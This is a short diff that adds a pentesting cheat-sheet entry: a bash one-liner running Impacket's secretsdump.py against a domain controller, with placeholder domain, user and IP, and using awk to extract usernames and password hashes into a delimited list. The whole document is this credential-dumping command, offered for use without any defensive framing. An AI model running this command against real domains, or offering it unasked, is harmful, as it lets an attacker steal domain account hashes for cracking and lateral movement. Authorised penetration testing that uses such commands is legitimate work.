@@ -1,0 +1,2 @@
+# bash oneliner. secrets dump DC username/hash delimited 
+secretsdump.py DOMAIN.local/user@IP | awk -F':' '/^[^ ]+:[0-9]+:/ {print $1 ":" $3 ":" $4}'
